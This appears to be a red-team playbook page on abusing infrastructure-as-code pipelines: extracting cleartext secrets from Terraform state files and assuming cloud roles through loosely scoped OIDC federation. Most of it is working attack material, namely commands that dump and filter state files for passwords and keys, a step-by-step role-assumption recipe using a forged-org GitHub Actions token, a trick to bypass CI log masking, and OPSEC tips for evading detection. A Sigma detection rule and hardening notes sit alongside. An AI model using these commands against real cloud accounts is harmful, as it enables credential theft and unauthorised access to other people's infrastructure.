# IaC State Secrets & CI/CD Federation Abuse

CWE-312 (Cleartext Storage of Sensitive Info), CWE-552 (Files Accessible to External Parties),
CWE-441 (Confused Deputy), CWE-1188 (Insecure Default), CWE-798 (Hardcoded Credentials).
ATT&CK: T1552.001 (Credentials in Files), T1199 (Trusted Relationship), T1078.004, T1098.001.

## Theory / Mechanism

Infrastructure-as-Code pipelines are a high-value attack surface for two reasons:
1. **State files** (Terraform `.tfstate`) record every managed resource attribute — including
   secrets (DB passwords, private keys, tokens) in **cleartext**. The state is, as Microsoft puts
   it, "your real blast radius."
2. **CI/CD federation**: pipelines increasingly use **OIDC** to exchange a short-lived JWT for
   cloud credentials instead of static keys. Federation removes a *credential*, not a *privilege* —
   if the cloud trust policy is scoped loosely (missing/wildcard `sub`, missing `aud`), an external
   actor can mint a matching token and assume the role with **no stored secret to steal**.

## 1. Terraform state secret extraction

```bash
# Locate state backends (S3 / Azure Blob / GCS) from compromised creds or repo config
grep -rEn 'backend "(s3|azurerm|gcs)"' . 2>/dev/null
grep -rEn 'bucket|storage_account_name|container_name' *.tf 2>/dev/null

# AWS S3 backend
aws s3 ls s3://tf-state-bucket --recursive | grep tfstate
aws s3 cp s3://tf-state-bucket/prod/terraform.tfstate - \
  | jq '.. | objects | with_entries(select(.key|test("password|secret|token|private_key|key";"i")))
        | select(length>0)'

# Azure Blob backend
az storage blob download --account-name SA --container-name tfstate \
  --name prod.terraform.tfstate --file - 2>/dev/null | jq '.resources[].instances[].attributes'

# GCS backend
gsutil cp gs://tf-state-bucket/prod/default.tfstate - | jq '.outputs'

# Generic secret pull from any state file
python3 ../scripts/oidc_trust_auditor.py --tfstate ./terraform.tfstate   # also extracts state secrets
```

Also harvest plan/apply artifacts and pipeline logs (CI often echoes variables), `terraform.tfvars`,
`*.auto.tfvars`, and remote-backend **lock**/version history.

## 2. OIDC federation trust-policy abuse

### AWS — `AssumeRoleWithWebIdentity`

A federated IAM role trusts an external OIDC provider (GitHub Actions, Terraform Cloud, GitLab).
The trust policy must pin both `aud` (audience) and `sub` (subject = which repo/branch/org). Common
flaws:

- **Missing `sub` condition** → any workflow from the provider can assume the role. (AWS shipped a
  too-loose default for Terraform Cloud roles created via the console; AWS tightened the default
  around **2025-02-07**, so that exact bug is largely closed — but pre-existing roles persist.)
- **Wildcard `sub`** (e.g. `repo:org/*` or `organization:hackingthe*`) → an attacker registers a
  matching org/repo name and assumes the role from an external account. **Still exploitable today.**
- **Missing `aud`** → token replay across providers.

```bash
# Find federated roles with weak/missing sub conditions
python3 ../scripts/oidc_trust_auditor.py --profile compromised --oidc

# Exploit shape (GitHub Actions OIDC against a role with wildcard sub):
#  1. Create a repo/org whose name matches the wildcard (e.g. org "hackingthe-x").
#  2. In a GH Actions workflow, request an OIDC token for the trusted audience:
#        permissions: { id-token: write }
#        TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
#                "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
#  3. Assume the victim role:
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::111122223333:role/github-deploy \
  --role-session-name pwn --web-identity-token "$TOKEN"
```

Defense-in-depth that the auditor flags as missing: **Resource Control Policies (RCPs)** (org-wide)
to block web-identity assumptions whose `sub` doesn't match an allow-list; pin full `repo:ORG/REPO:
ref:refs/heads/main` or `:environment:production`.

### Azure / GCP federated credentials

- **Azure**: app registrations support **federated identity credentials**; a loose `subject`
  /`issuer` lets an external workflow get tokens for the app. Enumerate with Graph:
  `GET /applications/{id}/federatedIdentityCredentials`.
- **GCP**: **Workload Identity Federation** pools map external IdP claims to SA impersonation; an
  over-broad `attribute.repository` / missing `attribute-condition` lets any repo impersonate the SA.
  `gcloud iam workload-identity-pools providers describe ...` to review the attribute mapping/condition.

## 3. Pipeline secret theft (when static secrets still exist)

```bash
# GitHub Actions: dump masked secrets via injection in a controllable workflow input
#   run: echo "${{ secrets.AWS_SECRET }}" | base64 | rev   # bypass log masking
# Self-hosted runners: persistent host -> read ~/.aws, env, /home/runner/work
# Look for long-lived keys in CI variable groups, Jenkins credentials.xml, GitLab CI/CD vars.
trufflehog git file://./repo --only-verified
gitleaks detect --source=. --report-format=json --report-path=leaks.json
```

## Detection

```yaml
title: Suspicious OIDC Web-Identity Role Assumption
id: f1a9c4d7-oidc-assume-webidentity
status: experimental
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName: AssumeRoleWithWebIdentity
  anomalies:
    - sourceIPAddress|cidr: '0.0.0.0/0'   # placeholder: replace with allow-list of CI egress
  filter_known_sub:
    requestParameters.subjectFromWebIdentityToken|startswith:
      - 'repo:my-org/'                     # expected repos/orgs only
  condition: selection and not filter_known_sub
level: high
falsepositives: [new legitimately-added repos/environments]
```

- AWS: `AssumeRoleWithWebIdentity` whose `sub`/repo is not in the expected set; sudden assumes from
  a new ASN. Terraform state buckets: `GetObject` on `*.tfstate` by a principal that is not the
  pipeline role.
- Azure: sign-ins for an app via federated credential from an unexpected issuer/subject.
- GCP: `GenerateAccessToken` via a Workload Identity pool provider with an unexpected attribute.

IOCs: state-file reads outside CI; web-identity assumes with mismatched `aud`/`sub`; CI logs
echoing reversed/encoded secrets; new federated credentials added to an app/SA/role.

## OPSEC

- Reading state from S3/Blob/GCS is **object-access logged** (CloudTrail data events / storage
  diagnostics) — only if data-event logging is enabled (often off). Pull once, parse offline.
- OIDC assumption needs **no stored secret** and produces a normal-looking `AssumeRoleWithWebIdentity`
  — quiet unless the SOC baselines expected `sub` values; the give-away is the source IP/`sub`.
- Don't leave attacker-registered repos/orgs around after exploiting a wildcard `sub`; they are a
  durable IOC.
- Self-hosted runner compromise is host-level — EDR-visible; treat like any host foothold.

## References

- Hacking The Cloud, "Exploiting Misconfigured Terraform Cloud OIDC AWS IAM Roles" — https://hackingthe.cloud/aws/exploitation/Misconfigured_Resource-Based_Policies/exploting_misconfigured_terraform_cloud_oidc_aws_iam_roles/
- AWS Prescriptive Guidance, Terraform provider security best practices — https://docs.aws.amazon.com/prescriptive-guidance/latest/terraform-aws-provider-best-practices/security.html
- Microsoft Community Hub, "Modernizing Terraform Pipelines on Azure: OIDC Federation" — https://techcommunity.microsoft.com/blog/azureinfrastructureblog/modernizing-terraform-pipelines-on-azure-oidc-federation-for-github-actions-and-/4516620
- GitHub Docs, "Configuring OpenID Connect in cloud providers" — https://docs.github.com/en/actions/deployment/security-hardening-your-deployments
- AWS RCP examples repository (block web-identity abuse) — https://github.com/aws-samples/resource-control-policy-examples
